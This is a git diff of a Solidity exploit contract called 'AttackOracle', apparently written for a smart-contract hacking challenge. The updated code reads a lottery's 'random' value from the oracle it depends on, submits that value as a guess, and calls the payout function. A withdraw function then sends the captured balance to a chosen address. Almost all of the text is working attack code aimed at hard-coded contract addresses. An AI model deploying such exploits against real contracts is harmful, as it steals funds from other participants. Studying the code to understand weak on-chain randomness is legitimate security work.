@@ -7,38 +7,37 @@ interface ILottery {
     function payoutWinningTeam(address _team) external returns (bool);
 }
 
-contract AttackOracle { // 0x44962eca0915Debe5B6Bb488dBE54A56D6C7935A
-    ILottery lottery;
+interface IOracle {
+    function getRandomNumber() external view returns (uint256);
+}
 
-    constructor(address lotteryAddress) payable {
+contract AttackOracle { 
+    ILottery lottery;
+    IOracle oracle; 
+    address lotteryAddress = 0x44962eca0915Debe5B6Bb488dBE54A56D6C7935A;
+    address oracleAddress = 0x0d186F6b68a95B3f575177b75c4144A941bFC4f3;
+
+    constructor() payable {
         lottery = ILottery(lotteryAddress);
+        oracle = IOracle(oracleAddress);
     }
 
+    /*
+    * Call this function with higher gas limit
+    */
     function attack() public {
-        lottery.makeAGuess(address(this), 256);
+        lottery.makeAGuess(address(this), oracle.getRandomNumber());
         lottery.payoutWinningTeam(address(this));    
     }
 
-    function setup() public payable {
-        lottery.registerTeam{value: 1_000_000_000}(address(this), "Team_Name", "Password");
+    function registration() external payable {
+        lottery.registerTeam{value: 1000000000 wei}(address(this), "Testing_Team", "Password");
 
-        for(uint i; i < 11 ; i++) {
-            lottery.makeAGuess(address(this), 256);
-            i++;       
-        }
-    }
-
-    function reg() public {
-        lottery.registerTeam(address(this), "333222222", "123abc");
     }
 
     function withdraw(address payable payout) public {
         (bool success, ) = address(payout).call{value: address(this).balance}('');
         require(success, "Failed to withdraw");
-    }
-
-    fallback() external payable {
-         attack();
     }
 
     receive() external payable {
